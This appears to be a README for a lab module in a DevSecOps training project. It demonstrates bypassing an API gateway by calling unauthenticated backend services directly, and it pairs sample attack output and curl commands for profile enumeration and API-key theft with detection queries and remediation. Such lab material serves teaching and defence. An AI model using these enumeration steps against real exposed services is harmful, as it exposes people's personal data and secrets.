# Direct Service Access Attack

## 🎯 Vulnerability

Backend services (user-service, auth-service) are exposed on public ports **without authentication**, allowing attackers to bypass the API Gateway and its security controls.

## ⚠️ Impact

| Security Control | Through Gateway | Direct Access |
|------------------|-----------------|---------------|
| JWT Validation | ✅ Required | ❌ Bypassed |
| Rate Limiting | ✅ 60 req/min | ❌ Unlimited |
| WAF Protection | ✅ Enabled | ❌ Bypassed |
| Logging | ✅ Centralized | ⚠️ Scattered |

**Result**: Complete security bypass, unlimited data exfiltration

## 🚀 Usage

### Prerequisites

```bash
# Install dependencies
pip install -r requirements.txt

# Ensure services are running
docker-compose ps
```

### Run Attack

```bash
python direct_access_attack.py
```

### Expected Output

```
==================================================================
🎭 DIRECT SERVICE ACCESS ATTACK - Gateway Bypass
==================================================================
Target User Service: http://localhost:8002
Target Auth Service: http://localhost:8000
Bypassing Gateway: http://localhost:8080
==================================================================

[*] Attack 1: Accessing user profiles directly...
    [>] Accessing http://localhost:8002/profile/1
    [✓] SUCCESS - Stolen profile:
        User: admin
        Email: admin@devsecops.local
        SSN: 12345678901 ⚠️ SENSITIVE
        Credit Card: **** **** **** 1234 ⚠️ SENSITIVE
...

📊 ATTACK REPORT
==================================================================
Total Attempts: 12
Successful: 10
Failed: 2
Data Items Exfiltrated: 8
==================================================================
```

## 📊 Attack Scenarios

### Scenario 1: Profile Enumeration

**Attack**:
```bash
for i in {1..10}; do
  curl http://localhost:8002/profile/$i
done
```

**Bypasses**:
- No JWT required
- No rate limiting
- Unlimited enumeration

### Scenario 2: API Key Theft

**Attack**:
```bash
curl http://localhost:8002/settings?user_id=1
```

**Result**:
```json
{
  "theme": "dark",
  "two_factor_enabled": true,
  "api_key": "admin-secret-api-key-12345"
}
```

### Scenario 3: Metrics Exposure

**Attack**:
```bash
curl http://localhost:8002/metrics
curl http://localhost:8000/metrics
```

**Leaked Info**:
- Service internals
- Request patterns
- User behavior
- System performance

## 🔍 Detection

The attack is tracked in Prometheus metrics:

```promql
# Direct access attempts
user_service_direct_access_total

# Unauthorized settings access
user_service_unauthorized_settings_access_total
```

**Query**:
```bash
curl http://localhost:9090/api/v1/query?query=user_service_direct_access_total
```

## 🛡️ Remediation

### Immediate (Quick Wins)

1. **Remove Port Exposure** - Don't expose backend ports

```yaml
# docker-compose.yml
user-service:
  ports:
    - "8002:8000"  # ❌ REMOVE THIS
```

2. **Use Internal Network** - Services communicate internally only
```yaml
user-service:
  # No ports section
  networks:
    - internal  # Gateway can reach, but not external traffic
```

### Long-term (Best Practice)

3. **Implement mTLS**
   - Require client certificates
   - Only Gateway has valid certificates
   - See: `infrastructure/certs/MTLS_IMPLEMENTATION_PLAN.md`

4. **Service-to-Service Auth**
   - Add API keys for inter-service communication
   - Validate `X-Gateway-Token` header

5. **Network Segmentation**
   - Use Kubernetes Network Policies
   - Service Mesh (Istio/Linkerd)

## 📈 Metrics Analysis

After running the attack, check Grafana:

```
http://localhost:3000
```

Look for:
- Spike in `user_service_direct_access_total`
- Requests without `X-Gateway` header
- Multiple profiles accessed by same IP

## 🧪 Testing

### Verify Vulnerability Exists

```bash
# Should work (VULNERABLE)
curl http://localhost:8002/profile/1

# Should fail (PROTECTED)
curl http://localhost:8080/api/users/profile/1
# {"detail":"Missing authorization header"}
```

### Verify Detection

```bash
# Check logs
docker-compose logs user-service | grep "Direct access"

# Check metrics
curl -s http://localhost:8002/metrics | grep direct_access
```

## 📚 Related

- [IDOR Attack](../idor-exploit/) - Exploits authorization flaws
- [Rate Limit Bypass](../rate-limit-bypass/) - Circumvents throttling
- [mTLS Implementation Plan](../../infrastructure/certs/MTLS_IMPLEMENTATION_PLAN.md)

---

**DISCLAIMER**: This is for educational purposes in a controlled lab environment. Do not use against systems you don't own.

